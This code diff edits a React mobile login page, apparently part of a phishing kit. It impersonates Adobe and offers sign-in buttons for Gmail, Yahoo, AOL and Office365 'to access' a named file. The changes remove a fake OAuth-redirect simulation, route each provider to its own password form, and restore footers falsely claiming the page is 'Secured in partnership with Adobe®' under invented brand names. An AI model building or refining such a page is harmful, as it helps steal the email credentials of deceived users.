@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState } from 'react';
 import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
 import { useLogin } from '../../hooks/useLogin';
 import Spinner from '../../components/common/Spinner';
@@ -27,8 +27,6 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
-  const [isRedirecting, setIsRedirecting] = useState(false);
-  const [isProcessingReturn, setIsProcessingReturn] = useState(false);
   
   const { isLoading, errorMessage, handleFormSubmit, resetLoginState } = useLogin(
     onLoginSuccess,
@@ -43,77 +41,6 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
     { name: 'Gmail', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png' },
     { name: 'Others', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
   ];
-
-  // Check URL parameters on component mount
-  useEffect(() => {
-    const urlParams = new URLSearchParams(window.location.search);
-    const provider = urlParams.get('provider');
-    const authCode = urlParams.get('code');
-    const oauthProvider = urlParams.get('oauth_provider');
-    
-    // Clean up URL if there are any OAuth params (meaning it's a refresh)
-    if (provider || authCode || oauthProvider) {
-      // Clear the URL to show main login page
-      const baseUrl = window.location.pathname;
-      window.history.replaceState({}, document.title, baseUrl);
-      return;
-    }
-  }, []);
-
-  const handleProviderReturn = (providerName: string) => {
-    // Clean up the URL
-    const baseUrl = window.location.pathname;
-    window.history.replaceState({}, document.title, baseUrl);
-    
-    // Trigger provider navigation immediately
-    if (providerName.toLowerCase() === 'gmail' && onGmailSelect) {
-      onGmailSelect();
-    } else if (providerName.toLowerCase() === 'yahoo' && onYahooSelect) {
-      onYahooSelect();
-    } else if (providerName.toLowerCase() === 'aol' && onAolSelect) {
-      onAolSelect();
-    } else if ((providerName.toLowerCase() === 'office365' || providerName.toLowerCase() === 'outlook') && onOffice365Select) {
-      onOffice365Select();
-    } else {
-      setSelectedProvider(providerName);
-    }
-  };
-
-  const simulateOAuthRedirect = (providerName: string) => {
-    // Show redirecting state
-    setIsRedirecting(true);
-    
-    // Generate OAuth-like parameters
-    const state = Math.random().toString(36).substr(2, 15);
-    const code = `auth_${Math.random().toString(36).substr(2, 20)}`;
-    
-    // First, update URL to show OAuth process is starting
-    const authStartParams = new URLSearchParams({
-      oauth_provider: providerName.toLowerCase(),
-      state: state,
-      redirect_initiated: 'true'
-    });
-    
-    const currentPath = window.location.pathname;
-    window.history.pushState({}, '', `${currentPath}?${authStartParams.toString()}`);
-    
-    // Simulate OAuth redirect delay
-    setTimeout(() => {
-      // Simulate returning from OAuth with auth code
-      const returnParams = new URLSearchParams({
-        code: code,
-        state: state,
-        provider: providerName,
-        scope: 'email profile',
-        auth_time: Date.now().toString()
-      });
-      
-      window.history.replaceState({}, '', `${currentPath}?${returnParams.toString()}`);
-      
-      // Trigger the provider's login page
-      handleProviderReturn(providerName);
-    }, 1500); // 1.5 second delay
-  };
   
   const handleSubmit = async (e: React.FormEvent) => {
     const result = await handleFormSubmit(e, { email, password, provider: selectedProvider });
@@ -127,14 +54,22 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
     setEmail('');
     setPassword('');
     resetLoginState();
-    setIsRedirecting(false);
-    setIsProcessingReturn(false);
   };
 
-  // Captcha removed: clicking a provider now proceeds immediately to redirect flow
   const handleProviderClick = (providerName: string) => {
-    // directly start redirect simulation / provider flow
-    simulateOAuthRedirect(providerName);
+    if (providerName === 'Office365' && onOffice365Select) {
+      onOffice365Select();
+    } else if (providerName === 'Outlook' && onOffice365Select) {
+      onOffice365Select();
+    } else if (providerName === 'Yahoo' && onYahooSelect) {
+      onYahooSelect();
+    } else if (providerName === 'AOL' && onAolSelect) {
+      onAolSelect();
+    } else if (providerName === 'Gmail' && onGmailSelect) {
+      onGmailSelect();
+    } else {
+      setSelectedProvider(providerName);
+    }
   };
 
   const AdobeLogo = () => (
@@ -159,7 +94,10 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
             <div className="flex justify-center mb-4">
               <AdobeLogo />
             </div>
-            {/* header text removed as requested */}
+            <h1 className="text-xl font-bold text-gray-900">Sign in to continue</h1>
+            <p className="text-gray-800 mt-2 text-sm font-medium">
+              to access <span className="font-bold text-gray-900">{fileName}</span>
+            </p>
           </div>
 
           <div className="p-6">
@@ -184,17 +122,8 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
                 </button>
               ))}
             </div>
-
-            {/* Footer: keep on one line while enabling horizontal scroll inside footer only (no page overflow) */}
             <div className="mt-8 text-center">
-              <div
-                className="inline-block max-w-full overflow-x-auto"
-                style={{ WebkitOverflowScrolling: 'touch' }}
-              >
-                <p className="text-sm text-gray-800 font-semibold drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)] whitespace-nowrap inline-block px-4">
-                  Xtranfervault.io. Secured in partnership with Adobe®.
-                </p>
-              </div>
+              <p className="text-sm text-gray-800 font-semibold drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)]">© 2025 Recoveryadobex. Secured in partnership with Adobe®.</p>
             </div>
           </div>
         </>
@@ -206,7 +135,9 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
               <AdobeLogo />
             </div>
             <h1 className="text-xl font-bold text-gray-900">Sign in with {selectedProvider}</h1>
-            
+            <p className="text-gray-800 mt-2 text-sm font-medium">
+              to access <span className="font-bold text-gray-900">{fileName}</span>
+            </p>
           </div>
 
           <div className="bg-white/60 backdrop-blur-md rounded-t-3xl shadow-2xl p-6 flex-grow-0 border-t border-white/30">
@@ -240,14 +171,8 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
               </button>
             </form>
           </div>
-
-          {/* Login form footer: keep on one line with internal horizontal scroll only */}
           <div className="bg-white/30 backdrop-blur-sm pt-2 pb-4">
-            <div className="max-w-full overflow-x-auto" style={{ WebkitOverflowScrolling: 'touch' }}>
-              <p className="text-xs text-gray-600 text-center inline-block whitespace-nowrap px-4">
-                Xtranfervault.io. Secured in partnership with Adobe®.
-              </p>
-            </div>
+            <p className="text-xs text-gray-600 text-center">© 2025 Recoveryadobex. Secured in partnership with Adobe®.</p>
           </div>
         </>
       )}
